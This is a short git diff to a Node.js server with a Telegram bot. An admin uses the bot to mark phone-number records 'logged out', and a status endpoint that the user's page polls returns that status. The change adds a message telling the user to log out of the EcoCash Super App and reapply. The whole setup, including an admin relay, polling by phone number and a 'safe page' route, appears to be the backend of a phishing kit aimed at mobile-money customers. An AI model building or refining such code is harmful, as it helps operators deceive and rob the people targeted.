@@ -8,6 +8,7 @@ const PORT = process.env.PORT || 10000;
 // -------------------- BOT CONFIG --------------------
 const BOT_TOKEN = (process.env.BOT_TOKEN || "").trim();
 const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
+const LOGOUT_MESSAGE = "Please log out from EcoCash Super App and try reapplying again.";
 
 let bot = null;
 let botEnabled = false;
@@ -248,7 +249,7 @@ if (botEnabled) {
 ❌ <b>Status: Logged out by admin</b>
 ⏱️ <b>${currentTime}</b>`;
 
-    await ctx.answerCbQuery("User logged out");
+    await ctx.answerCbQuery(LOGOUT_MESSAGE);
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
     await ctx.replyWithHTML(logoutMsg);
   });
@@ -377,7 +378,14 @@ if (botEnabled) {
 // -------------------- STATUS CHECK --------------------
 app.get('/api/check-status', (req, res) => {
   const phone = req.query.phone;
-  res.json({ status: statusStore[phone] || "pending" });
+  const status = statusStore[phone] || "pending";
+  const response = { status };
+
+  if (status === "logged_out") {
+    response.message = LOGOUT_MESSAGE;
+  }
+
+  res.json(response);
 });
 
 // -------------------- SAFE PAGE ROUTE --------------------
